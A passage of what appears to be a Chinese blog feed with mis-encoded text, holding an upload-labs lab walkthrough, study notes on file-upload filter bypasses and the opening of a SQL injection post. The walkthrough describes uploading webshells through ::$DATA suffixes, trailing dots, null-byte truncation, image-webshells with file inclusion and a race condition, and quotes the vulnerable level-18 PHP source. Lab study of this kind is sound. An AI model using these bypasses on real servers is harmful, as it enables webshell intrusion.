phpæ–‡ä»¶åœ¨bpä¸­å°†phpæ”¹ä¸ºphp::$DATAå³å¯æˆåŠŸä¸Šä¼ </p><img src="/2025/03/13/upload-labs/image-20250113214647770.png" class="" title="image-20250113214647770"><p>ä¸Šä¼ æˆåŠŸåä½¿ç”¨æœ¨é©¬è¿›è¡Œè¿æ¥</p><img src="/2025/03/13/upload-labs/image-20250113214535151.png" class="" title="image-20250113214535151"><h1 id="ç¬¬åå…³"><a href="#ç¬¬åå…³" class="headerlink" title="ç¬¬åå…³"></a>ç¬¬åå…³</h1><p>è€ƒå¯Ÿç‚¹ç©ºæ ¼ç»•è¿‡</p><p>å°†ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶åç¼€æ”¹ä¸º.php. . å³å¯ç»•è¿‡</p><img src="/2025/03/13/upload-labs/image-20250113221551452.png" class="" title="image-20250113221551452"><p>ä¹‹åèšå‰‘è¿æ¥.phpæ–‡ä»¶å³å¯</p><img src="/2025/03/13/upload-labs/image-20250113221509151.png" class="" title="image-20250113221509151"><h1 id="ç¬¬åä¸€å…³"><a href="#ç¬¬åä¸€å…³" class="headerlink" title="ç¬¬åä¸€å…³"></a>ç¬¬åä¸€å…³</h1><img src="/2025/03/13/upload-labs/image-20250113222023512.png" class="" title="image-20250113222023512"><p>è¯¥å…³è€ƒå¯ŸåŒå†™ç»•è¿‡æ ¹æ®æºç åªæ£€æµ‹ä¸€æ¬¡åç¼€åæ‰€ä»¥åŒå†™åç¼€åå³å¯</p><img src="/2025/03/13/upload-labs/image-20250113222557414.png" class="" title="image-20250113222557414"><p>åä½¿ç”¨èšå‰‘è¿æ¥</p><img src="/2025/03/13/upload-labs/image-20250113222533194.png" class="" title="image-20250113222533194"><h1 id="ç¬¬åäºŒå…³"><a href="#ç¬¬åäºŒå…³" class="headerlink" title="ç¬¬åäºŒå…³"></a>ç¬¬åäºŒå…³</h1> <img src="/2025/03/13/upload-labs/image-20250113222747446.png" class="" title="image-20250113222747446"><p>è¯¥é¢˜ç›®è®¾ç½®ç™½åå•ä¸”å‰é¢æ–¹æ³•ä¸èƒ½ä½¿ç”¨ï¼Œè¯¥é¢˜è€ƒå¯Ÿç©ºå­—ç¬¦ç»•è¿‡</p><p>ä½¿ç”¨bpæŠ“åŒ…å°†å…¶ä¸Šä¼ è·¯å¾„æ”¹ä¸ºmuma.php%00å³å¯</p><img src="/2025/03/13/upload-labs/image-20250114195716711.png" class="" title="image-20250114195716711"><img src="/2025/03/13/upload-labs/image-20250114195624071.png" class="" title="image-20250114195624071"><h1 id="ç¬¬åä¸‰å…³"><a href="#ç¬¬åä¸‰å…³" class="headerlink" title="ç¬¬åä¸‰å…³"></a>ç¬¬åä¸‰å…³</h1><p>è¯¥å…³å¡ä¹Ÿæ˜¯è€ƒå¯Ÿç©ºå­—ç¬¦ç»•è¿‡ä¸è¿‡ä½¿ç”¨çš„æ˜¯0x00å¹¶ä¸”ä½¿ç”¨postä¼ å‚</p><p>å¦‚ä¸‹æ–¹ä¿®æ”¹å³å¯ä¸Šä¼ æˆåŠŸ</p><img src="/2025/03/13/upload-labs/image-20250114214410877.png" class="" title="image-20250114214410877"><p><strong><img src="/2025/03/13/upload-labs/image-20250114214519504.png" class="" title="image-20250114214519504"></strong></p><h1 id="ç¬¬åå››å…³"><a href="#ç¬¬åå››å…³" class="headerlink" title="ç¬¬åå››å…³"></a>ç¬¬åå››å…³</h1><p>ï¼ˆæ³¨æ„å›¾ç‰‡é©¬ä¸å®œè¿‡å¤§å¦åˆ™ä¼šè§£æå¤±è´¥ï¼‰</p><p>è¯¥å…³è€ƒå¯Ÿå›¾ç‰‡å­—èŠ‚ä¸æ–‡ä»¶åŒ…å«æ¼æ´</p><img src="/2025/03/13/upload-labs/image-20250115203858021.png" class="" title="image-20250115203858021"><p>ä¼šæ ¹æ®æ–‡ä»¶å‰å‡ ä½å­—èŠ‚è¿›è¡Œåˆ¤æ–­ï¼Œåœ¨å›¾ç‰‡é©¬å‰åŠ å…¥å‡ ä¸ªå­—èŠ‚æ–¹ä¾¿010è¿›è¡Œä¿®æ”¹</p><img src="/2025/03/13/upload-labs/image-20250115204132057.png" class="" title="image-20250115204132057"><img src="/2025/03/13/upload-labs/image-20250115203743766.png" class="" title="image-20250115203743766"><p>ç„¶åå°è¯•ä¸Šä¼ æ–‡ä»¶</p><img src="/2025/03/13/upload-labs/image-20250115204656908.png" class="" title="image-20250115204656908"><p>æˆåŠŸä¸Šä¼ phpæ–‡ä»¶ï¼Œä½†æ­¤æ—¶èšå‰‘æ— æ³•è¿›è¡Œè¿æ¥ï¼Œäºæ˜¯åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´</p><p>è¿›è¡Œæ–‡ä»¶åŒ…å«ä½¿å…¶è¢«è§£æä¸ºphpæ–‡ä»¶ä½¿ç”¨èšå‰‘è¿æ¥å³å¯</p><p><strong><img src="/2025/03/13/upload-labs/image-20250115205428330.png" class="" title="image-20250115205428330"></strong></p><h1 id="ç¬¬åäº”å…³"><a href="#ç¬¬åäº”å…³" class="headerlink" title="ç¬¬åäº”å…³"></a>ç¬¬åäº”å…³</h1><p>è¯¥å…³å¡ç¯å¢ƒPHP 4 &gt;&#x3D; 4.3.0, PHP 5, PHP 7å¹¶ä¸”å¼€å¯php_exif</p><p>è¯¥å…³ä½¿ç”¨getimagesize() å‡½æ•°</p><p>æ•…ä»ä½¿ç”¨å›¾ç‰‡é©¬ä¸Šä¼ å³å¯ï¼Œä¸‹é¢ä¸ºå›¾ç‰‡é©¬åˆ¶ä½œæŒ‡ä»¤</p><img src="/2025/03/13/upload-labs/image-20250115210903379.png" class="" title="image-20250115210903379"><p>ä¹‹åå†æ¬¡åˆ©ç”¨æ–‡ä»¶åŒ…å«å³å¯</p><img src="/2025/03/13/upload-labs/image-20250115211101535.png" class="" title="image-20250115211101535"><p>æœ€åä½¿ç”¨èšå‰‘è¿æ¥ã€‚ä¸14å…³ä¸€è‡´</p><h1 id="ç¬¬åå…­å…³"><a href="#ç¬¬åå…­å…³" class="headerlink" title="ç¬¬åå…­å…³"></a>ç¬¬åå…­å…³</h1><p>è¯¥å…³ä½¿ç”¨exif_imagetype()è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶åç¼€åã€‚<br>è¿”å›å€¼ä¸getimage()å‡½æ•°è¿”å›çš„ç´¢å¼•2ç›¸åŒï¼Œä½†æ˜¯é€Ÿåº¦æ¯”getimageå¿«</p><p>å…¶å¯¹åº”è§£æ³•ä¸14å…³ç›¸åŒ</p><h1 id="ç¬¬åä¸ƒå…³"><a href="#ç¬¬åä¸ƒå…³" class="headerlink" title="ç¬¬åä¸ƒå…³"></a>ç¬¬åä¸ƒå…³</h1><p>è¯¥å…³å¯¹å›¾ç‰‡è¿›è¡Œäº†äºŒæ¬¡æ¸²æŸ“æ•…éœ€è¦å¯¹æ–‡ä»¶è¿›è¡Œæ¯”è¾ƒ</p><p>å¯¹ä¸¤æ¬¡ä¸Šä¼ çš„å›¾ç‰‡è¿›è¡Œæ¯”è¾ƒæ‰¾åˆ°æœªå‘ç”Ÿæ›´æ”¹çš„åœ°æ–¹</p><img src="/2025/03/13/upload-labs/image-20250115213303611.png" class="" title="image-20250115213303611"><p>ä½¿ç”¨010è¿›è¡Œæ–‡ä»¶æ¯”è¾ƒå³å¯</p><img src="/2025/03/13/upload-labs/image-20250115213327859.png" class="" title="image-20250115213327859"><p>æ‰¾åˆ°æœªå‘ç”Ÿæ›´æ”¹çš„åœ°æ–¹å°†å…¶æ”¹ä¸ºä¸€å¥è¯æœ¨é©¬ç„¶åä¸Šä¼ åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è®¿é—®å³å¯</p><img src="/2025/03/13/upload-labs/image-20250115213709057.png" class="" title="image-20250115213709057"><h1 id="ç¬¬åå…«å…³"><a href="#ç¬¬åå…«å…³" class="headerlink" title="ç¬¬åå…«å…³"></a>ç¬¬åå…«å…³</h1><p>è¯¥å…³ä½¿ç”¨æ¡ä»¶ç«äº‰</p><img src="/2025/03/13/upload-labs/image-20250115215257565.png" class="" title="image-20250115215257565"><p>å³å…ˆä¸æ–­ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åæƒ³åŠæ³•åœ¨æ–‡ä»¶è¢«åˆ é™¤å‰è®¿é—®è¯¥æ–‡ä»¶ï¼Œä»¥è¾¾åˆ°æ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œä»è€Œé¿å…è¢«ç³»ç»Ÿåˆ é™¤çš„ç›®çš„ã€‚ä¹‹åï¼Œæˆ‘ä»¬å°è¯•è®¿é—®ä¸Šä¼ åçš„æœ¨é©¬æ–‡ä»¶ï¼Œé‡‡ç”¨åŒæ ·çš„æ€è·¯è¿›è¡ŒæŠ“åŒ…ï¼Œå¹¶å°†è¯¥æ•°æ®åŒ…å‘é€åˆ°Intruderæ¨¡å—ã€‚å¯åŠ¨Intruderæ¨¡å—ï¼Œä½¿å¾—Burpsuitä¸æ–­è®¿é—®è¯¥æ–‡ä»¶ï¼ŒåŒæ—¶åœ¨Burpsuitçš„Repeateræ¨¡å—ä¸­ä¸æ–­ä¸Šä¼ è¯¥æ•°æ®åŒ…</p><img src="/2025/03/13/upload-labs/image-20250115215439977.png" class="" title="image-20250115215439977"><p>å‡­å€Ÿè¿æ°”æ¥è¿›è¡Œè¿æ¥å³å¯</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> é¶åœºè®°å½• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>uploadçŸ¥è¯†ç‚¹</title>
      <link href="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="uploadå­¦ä¹ çŸ¥è¯†ç‚¹"><a href="#uploadå­¦ä¹ çŸ¥è¯†ç‚¹" class="headerlink" title="uploadå­¦ä¹ çŸ¥è¯†ç‚¹"></a>uploadå­¦ä¹ çŸ¥è¯†ç‚¹</h1><p>uploadå­¦ä¹ è¿‡ç¨‹ä¸­æ¶‰åŠçš„çŸ¥è¯†ç‚¹</p><h2 id="ä¸€ã€é…ç½®æ–‡ä»¶"><a href="#ä¸€ã€é…ç½®æ–‡ä»¶" class="headerlink" title="ä¸€ã€é…ç½®æ–‡ä»¶"></a>ä¸€ã€é…ç½®æ–‡ä»¶</h2><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250113102031543.png" class="" title="image-20250113102031543">_Preview Image<p>å¯¹é…ç½®æ–‡ä»¶çš„ä¿®æ”¹</p><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250113104230202.png" class="" title="image-20250113104230202"><p>uploadç›¸å…³é…ç½®æ–‡ä»¶</p><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250113104958667.png" class="" title="image-20250113104958667"><p>.htaccessæ–‡ä»¶çš„ä¼˜å…ˆçº§é«˜æ‰€ä»¥å…¶å±é™©æ€§æ›´å¤§</p><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250113105142420.png" class="" title="image-20250113105142420"><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250113105321212.png" class="" title="image-20250113105321212"><p>user.iniæ–‡ä»¶ç”Ÿæ•ˆå‰ææ˜¯ç›®å½•ä¸­å­˜åœ¨phpæ–‡ä»¶å¯ä»¥å¯¹å…¶è¿›è¡Œè¦†ç›–</p><h2 id="äºŒã€é¢å¤–æ•°æ®æµ"><a href="#äºŒã€é¢å¤–æ•°æ®æµ" class="headerlink" title="äºŒã€é¢å¤–æ•°æ®æµ"></a>äºŒã€é¢å¤–æ•°æ®æµ</h2><p>åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œå½“ä½ çœ‹åˆ°æ–‡ä»¶ååè·Ÿç€â€::D A T A â€œ æ—¶ï¼Œå®ƒè¡¨ç¤ºæ–‡ä»¶çš„ä¸€ä¸ªé™„åŠ æ•°æ®æµ ( A l t e r n a t e D a t a S t r e a m ï¼Œ A D S ) ã€‚æ•°æ®æµæ˜¯ âˆ’ âˆ’ ç§ç”¨äºåœ¨æ–‡ä»¶å†…éƒ¨å­˜å‚¨é¢å¤–æ•°æ®çš„æœºåˆ¶åœ¨æ™®é€šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ–‡ä»¶åªæœ‰ä¸€ä¸ªé»˜è®¤çš„æ•°æ®æµï¼Œå¯ä»¥é€šè¿‡æ–‡ä»¶åè®¿é—®ã€‚ä½†æ˜¯ W i n d o w s N T æ–‡ä»¶ç³»ç»Ÿ ( N T F S ) æ”¯æŒåœ¨æ–‡ä»¶å†…éƒ¨åˆ›å»ºé¢å¤–çš„æ•°æ®æµï¼Œä»¥å­˜å‚¨å…¶ä»–ä¿¡æ¯ã€‚è¿™äº›é¢å¤–çš„æ•°æ®æµå¯ä»¥é€šè¿‡åœ¨æ–‡ä»¶ååé¢æ·»åŠ  â€œ â€¦ DATAâ€æ—¶ï¼Œå®ƒè¡¨ç¤ºæ–‡ä»¶çš„ä¸€ä¸ªé™„åŠ æ•°æ®æµ(Alternate DataStreamï¼ŒADS)ã€‚æ•°æ®æµæ˜¯â€“ç§ç”¨äºåœ¨æ–‡ä»¶å†…éƒ¨å­˜å‚¨é¢å¤–æ•°æ®çš„æœºåˆ¶ åœ¨æ™®é€šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ–‡ä»¶åªæœ‰ä¸€ä¸ªé»˜è®¤çš„æ•°æ®æµï¼Œå¯ä»¥é€šè¿‡æ–‡ä»¶åè®¿é—®ã€‚ä½†æ˜¯Windows NTæ–‡ä»¶ç³»ç»Ÿ(NTFS)æ”¯æŒåœ¨æ–‡ä»¶å†…éƒ¨åˆ›å»ºé¢å¤–çš„æ•°æ®æµï¼Œä»¥å­˜å‚¨å…¶ä»–ä¿¡æ¯ã€‚è¿™äº›é¢å¤–çš„æ•°æ®æµå¯ä»¥é€šè¿‡åœ¨æ–‡ä»¶ååé¢æ·»åŠ â€â€¦DATAâ€æ—¶ï¼Œå®ƒè¡¨ç¤ºæ–‡ä»¶çš„ä¸€ä¸ªé™„åŠ æ•°æ®æµ(AlternateDataStreamï¼ŒADS)ã€‚æ•°æ®æµæ˜¯âˆ’âˆ’ç§ç”¨äºåœ¨æ–‡ä»¶å†…éƒ¨å­˜å‚¨é¢å¤–æ•°æ®çš„æœºåˆ¶åœ¨æ™®é€šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ–‡ä»¶åªæœ‰ä¸€ä¸ªé»˜è®¤çš„æ•°æ®æµï¼Œå¯ä»¥é€šè¿‡æ–‡ä»¶åè®¿é—®ã€‚ä½†æ˜¯WindowsNTæ–‡ä»¶ç³»ç»Ÿ(NTFS)æ”¯æŒåœ¨æ–‡ä»¶å†…éƒ¨åˆ›å»ºé¢å¤–çš„æ•°æ®æµï¼Œä»¥å­˜å‚¨å…¶ä»–ä¿¡æ¯ã€‚è¿™äº›é¢å¤–çš„æ•°æ®æµå¯ä»¥é€šè¿‡åœ¨æ–‡ä»¶ååé¢æ·»åŠ â€â€¦DATAâ€æ¥è®¿é—®<br>åŸç†:Windowsç³»ç»Ÿä¸‹ï¼Œå¦‚æœä¸Šä¼ çš„æ–‡ä»¶åä¸­test.php::$DATAä¼šåœ¨æœåŠ¡å™¨ä¸Šç”Ÿæˆ-ä¸ªtest.phpçš„æ–‡ä»¶ï¼Œå…¶ä¸­å†…å®¹å’Œæ‰€ä¸Šä¼ æ–‡ä»¶å†…å®¹ç›¸åŒï¼Œå¹¶è¢«è§£ã€‚<br> <img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250113212429743.png" class="" title="image-20250113212429743"></p><p>è¦è®¿é—®é¢å¤–æ•°æ®æµä¿¡æ¯å³å¯noteoad æ–‡ä»¶åç§° ï¼š è®¾ç½®çš„æ•°æ®æµç©ºé—´åç§°</p><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250113212441804.png" class="" title="image-20250113212441804"><p>phpä¸ä¼šéªŒè¯æ–‡ä»¶æ•°æ®æµæ•…å¯ä»¥ä¸Šä¼ æˆåŠŸ</p><p>åœ¨windowsä¸­ä¸å…è®¸æ–‡ä»¶ååç¼€å¸¦æœ‰ï¼šï¼š$æ•…ä¸Šä¼ åphpåçš„æ ‡è¯†ä¼šæ¶ˆå¤±</p><h2 id="ä¸‰-ç©ºæ ¼ç»•è¿‡"><a href="#ä¸‰-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ä¸‰.ç©ºæ ¼ç»•è¿‡"></a>ä¸‰.ç©ºæ ¼ç»•è¿‡</h2><p>windowsç³»ç»Ÿä¸­.ç©ºæ ¼ä¼šè¢«è‡ªåŠ¨åˆ é™¤æ‰€ä»¥å¯ä»¥ç”¨æ¥ç»•è¿‡</p><p>æ‰€ä»¥åœ¨ä¸Šä¼ æœ¨é©¬çš„æ—¶å€™å¯ä»¥å°†phpæ–‡ä»¶åç¼€åŠ å…¥.ç©ºæ ¼.ç©ºæ ¼æ¥ç»•è¿‡</p><h2 id="å››ã€ç©ºå­—ç¬¦"><a href="#å››ã€ç©ºå­—ç¬¦" class="headerlink" title="å››ã€ç©ºå­—ç¬¦"></a>å››ã€ç©ºå­—ç¬¦</h2><p>0x00ä¸%00éƒ½è¡¨ç¤ºç©º</p><h2 id="äº”ã€å›¾ç‰‡å­—èŠ‚è¡¨ç¤º"><a href="#äº”ã€å›¾ç‰‡å­—èŠ‚è¡¨ç¤º" class="headerlink" title="äº”ã€å›¾ç‰‡å­—èŠ‚è¡¨ç¤º"></a>äº”ã€å›¾ç‰‡å­—èŠ‚è¡¨ç¤º</h2><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250115110024514.png" class="" title="image-20250115110024514"><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250115170138085.png" class="" title="image-20250115170138085"><h2 id="å…­ã€ç›¸å…³phpå‡½æ•°"><a href="#å…­ã€ç›¸å…³phpå‡½æ•°" class="headerlink" title="å…­ã€ç›¸å…³phpå‡½æ•°"></a>å…­ã€ç›¸å…³phpå‡½æ•°</h2><p>getimagesize() å‡½æ•°è·å–å›¾åƒæ–‡ä»¶çš„ä¿¡æ¯ï¼Œè¿”å›ä¸€ä¸ªåŒ…å«å¤šä¸ªå…ƒç´ çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„åŒ…æ‹¬å›¾åƒçš„å®½åº¦ã€é«˜åº¦ã€MIME ç±»å‹ç­‰ä¿¡æ¯ã€‚<br>å¦‚æœ $filename ä¸æ˜¯å›¾åƒæ–‡ä»¶ï¼Œgetimagesize() ä¼šè¿”å› falseã€‚</p><p>exif_imagetype() è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚å¦‚æœå‘ç°äº†æ°å½“çš„ç­¾ååˆ™è¿”å›ä¸€ä¸ªå¯¹åº”çš„å¸¸é‡ï¼Œå¦åˆ™è¿”å› FALSEã€‚è¿”å›å€¼å’Œ getimagesize() è¿”å›çš„æ•°ç»„ä¸­çš„ç´¢å¼• 2 çš„å€¼æ˜¯ä¸€æ ·çš„ï¼Œä½†æœ¬å‡½æ•°å¿«å¾—å¤šã€‚</p><p>é‚£ä¹ˆå®ƒçš„è¯­æ³•æ˜¯ï¼š</p><p>exif_imagetype ( string $filename ) : int</p><p>$filenameæ˜¯æ–‡ä»¶ä½ç½®å’Œåç§°ï¼Œå¦‚æœæ£€æŸ¥æ˜¯å›¾ç‰‡æ–‡ä»¶åˆ™è¿”å›ä¸€ä¸ªè·Ÿå›¾åƒç±»å‹å¯¹åº”çš„æ•°å­—ï¼Œå¦åˆ™è¿”å› FALSEã€‚</p><p>image_type_to_extension($info[2]) ä¼šæ ¹æ® getimagesize() è¿”å›çš„å›¾åƒä¿¡æ¯ä¸­çš„ MIME ç±»å‹ï¼ˆå³ $info[2]ï¼‰è¿”å›å¯¹åº”çš„æ‰©å±•åã€‚ä¾‹å¦‚ï¼Œimage_type_to_extension() ä¼šæŠŠ IMAGETYPE_JPEG è½¬æ¢ä¸º .jpegï¼ŒIMAGETYPE_PNG è½¬æ¢ä¸º .pngï¼Œç­‰ç­‰ã€‚<br>æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨å…è®¸çš„å›¾åƒç±»å‹ä¸­ï¼š</p><p>pathinfo()è¯¥å‡½æ•°ç”¨äºè·å–å…¶åç¼€åç§°<strong>æ–‡ä»¶æ‰©å±•åè·å–</strong>ï¼šå¯ä»¥é€šè¿‡ <code>pathinfo()</code> æå–æ–‡ä»¶çš„æ‰©å±•åï¼Œæ–¹ä¾¿åšæ–‡ä»¶ç±»å‹æ£€æŸ¥</p><p>$ext &#x3D; pathinfo($filename, PATHINFO_EXTENSION);</p><h2 id="ä¸ƒã€äºŒæ¬¡æ¸²æŸ“"><a href="#ä¸ƒã€äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="ä¸ƒã€äºŒæ¬¡æ¸²æŸ“"></a>ä¸ƒã€äºŒæ¬¡æ¸²æŸ“</h2><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250115212724670.png" class="" title="image-20250115212724670"><p>äºŒæ¬¡æ¸²æŸ“ä¼šå¯¹æ–‡ä»¶è¿›è¡Œä¸€æ¬¡é‡å†™å…¶æ˜¾ç¤ºçš„å†…å®¹ä¸å˜ä½†æ˜¯æ–‡ä»¶æœ¬èº«å†…å®¹å‘é€ä¸€éƒ¨åˆ†çš„æ”¹å˜</p><h2 id="å…«ã€æ¡ä»¶ç«äº‰"><a href="#å…«ã€æ¡ä»¶ç«äº‰" class="headerlink" title="å…«ã€æ¡ä»¶ç«äº‰"></a>å…«ã€æ¡ä»¶ç«äº‰</h2><p>upload-labs18å…³çš„æºç </p><p>$is_upload &#x3D; false;<br>$msg &#x3D; null;<br>if(isset($_POST[â€˜submitâ€™])){  &#x2F;&#x2F; æ£€æŸ¥æ˜¯å¦æäº¤äº†ä¸Šä¼ è¡¨å•ï¼Œå¦‚æœæäº¤äº†åˆ™æ‰§è¡Œä¸‹é¢çš„ä»£ç å—<br>    $ext_arr &#x3D; array(â€˜jpgâ€™,â€™pngâ€™,â€™gifâ€™);  &#x2F;&#x2F; å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹æ•°ç»„ï¼ŒåŒ…æ‹¬jpgï¼Œpngï¼Œgif<br>    $file_name &#x3D; $_FILES[â€˜upload_fileâ€™][â€˜nameâ€™];    &#x2F;&#x2F; ä»ä¸Šä¼ è¡¨å•ä¸­è·å–ä¸Šä¼ æ–‡ä»¶çš„åå­—<br>    $temp_file &#x3D; $_FILES[â€˜upload_fileâ€™][â€˜tmp_nameâ€™];    &#x2F;&#x2F; ä»ä¸Šä¼ è¡¨å•ä¸­è·å–ä¸Šä¼ æ–‡ä»¶çš„ä¸´æ—¶è·¯å¾„<br>    $file_ext &#x3D; substr($file_name,strrpos($file_name,â€.â€)+1);  &#x2F;&#x2F; è·å–ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•åï¼Œå³æ–‡ä»¶åçš„æœ€åéƒ¨åˆ†<br>    $upload_file &#x3D; UPLOAD_PATH . â€˜&#x2F;â€˜ . $file_name;  &#x2F;&#x2F; æ‹¼æ¥å‡ºä¸Šä¼ æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼Œåˆ›å»ºä»¥åŸæ–‡ä»¶åä¸ºåçš„æ–‡ä»¶<br>    if(move_uploaded_file($temp_file, $upload_file)){  &#x2F;&#x2F; å°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°æŒ‡å®šçš„è·¯å¾„ï¼Œå¦‚æœç§»åŠ¨æˆåŠŸåˆ™æ‰§è¡Œ<br>        if(in_array($file_ext,$ext_arr)){  &#x2F;&#x2F; æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•åæ˜¯å¦åœ¨å…è®¸çš„ç±»å‹æ•°ç»„ä¸­ï¼Œå¦‚æœåœ¨åˆ™æ‰§è¡Œä¸‹é¢çš„ä»£ç å—<br>            $img_path &#x3D; UPLOAD_PATH . â€˜&#x2F;â€˜. rand(10, 99).date(â€œYmdHisâ€).â€.â€.$file_ext;<br>            #ç”Ÿæˆæ–°çš„æ–‡ä»¶åï¼ŒåŒ…æ‹¬éšæœºæ•°å­—ã€å½“å‰æ—¥æœŸå’Œæ—¶é—´ä»¥åŠåŸæ–‡ä»¶çš„æ‰©å±•å<br>            rename($upload_file, $img_path);   &#x2F;&#x2F; å°†ä¸Šä¼ çš„æ–‡ä»¶é‡å‘½åä¸ºæ–°çš„æ–‡ä»¶å<br>            $is_upload &#x3D; true;<br>        }else{  &#x2F;&#x2F; å¦‚æœä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•åä¸åœ¨å…è®¸çš„ç±»å‹æ•°ç»„ä¸­ï¼Œåˆ™è®¾ç½®é”™è¯¯æ¶ˆæ¯ï¼Œå¹¶åˆ é™¤ä¸Šä¼ çš„æ–‡ä»¶<br>            $msg &#x3D; â€œåªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼â€;<br>            unlink($upload_file);<br>        }<br>    }else{<br>        $msg &#x3D; â€˜ä¸Šä¼ å‡ºé”™ï¼â€™;<br>    }<br>}</p><p>å°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åé€šè¿‡renameä¿®æ”¹åç§°ï¼Œå†é€šè¿‡unlinkåˆ é™¤æ–‡ä»¶ï¼Œå› æ­¤å¯é€šè¿‡æ¡ä»¶ç«äº‰çš„æ–¹å¼åœ¨unlinkä¹‹å‰ï¼Œè®¿é—®webshellã€‚</p><p>ä½¿ç”¨burpæ‹¦æˆªä¸Šä¼ 18.phpçš„æ•°æ®åŒ…å¹¶å¯¹æ•°æ®åŒ…å‘é€è‡³intruderæ¨¡å—è¿›è¡Œé«˜é€Ÿé‡å‘ï¼ˆä¸Šä¼ åŒ…ï¼‰</p><p>å…¶å®å°±æ˜¯åˆ©ç”¨ä»£ç æ‰§è¡Œçš„é€»è¾‘é—®é¢˜æ¥è¿›è¡Œä¸Šä¼ ï¼Œå¦‚ï¼šå½“æ–‡ä»¶å…ˆä¸Šä¼ åæ”¹åæ—¶å°±å¯ä»¥é€šè¿‡ä¸æ–­çš„å‘åŒ…ä»è€Œè®¿é—®åˆ°æŒ‡å®šçš„æ–‡ä»¶</p><p>æ¡ä»¶ç«äº‰è§£é‡Šï¼š</p><img src="/2025/03/12/upload%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250115214051648.png" class="" title="image-20250115214051648"><h2 id="ä¹ã€ç³»ç»Ÿè§£ææ¼æ´"><a href="#ä¹ã€ç³»ç»Ÿè§£ææ¼æ´" class="headerlink" title="ä¹ã€ç³»ç»Ÿè§£ææ¼æ´"></a>ä¹ã€ç³»ç»Ÿè§£ææ¼æ´</h2><p>ç³»ç»Ÿè§£ææ–‡ä»¶æ˜¯ä»åå¾€å‰è§£æï¼Œå¦‚1.php.7zå…ˆè§£æ7zåè§£æphpï¼Œæ•…é˜¿å¸•å¥‡ç³»ç»Ÿå­˜åœ¨æ­¤æ–‡ä»¶ä¸Šä¼ æ¼æ´</p><h2 id="PHPä¸´æ—¶æ–‡ä»¶ä¸Šä¼ "><a href="#PHPä¸´æ—¶æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="PHPä¸´æ—¶æ–‡ä»¶ä¸Šä¼ "></a>PHPä¸´æ—¶æ–‡ä»¶ä¸Šä¼ </h2>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹  </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥</title>
      <link href="/2024/11/11/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/11/11/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>sqlæ³¨å…¥å‘ç”ŸåŸç†ï¼š</p><p>ç”¨æˆ·å¯¹ä¼ å…¥çš„å‚æ•°æœªè¿›è¡Œä¸¥æ ¼è¿‡æ»¤å¤„ç†ï¼Œå¯¼è‡´æ„é€ å½¢æˆsqlè¯­å¥ï¼Œç›´æ¥è¾“å…¥æ•°æ®åº“æ‰§è¡Œï¼Œä»è€Œè·å–å’Œä¿®æ”¹æ•°æ®åº“</p><h4 id="æ³¨å…¥ç±»å‹"><a href="#æ³¨å…¥ç±»å‹" class="headerlink" title="æ³¨å…¥ç±»å‹"></a>æ³¨å…¥ç±»å‹</h4><p>å¸¸è§çš„æ³¨å…¥æ–¹å¼æœ‰ï¼šå­—ç¬¦å‹æ³¨å…¥ã€å¸ƒå°”å‹æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥ã€æ–‡ä»¶è¯»å†™æ³¨å…¥ã€å¸ƒå°”ç›²æ³¨ã€æ—¶é—´ç›²æ³¨ã€å †å 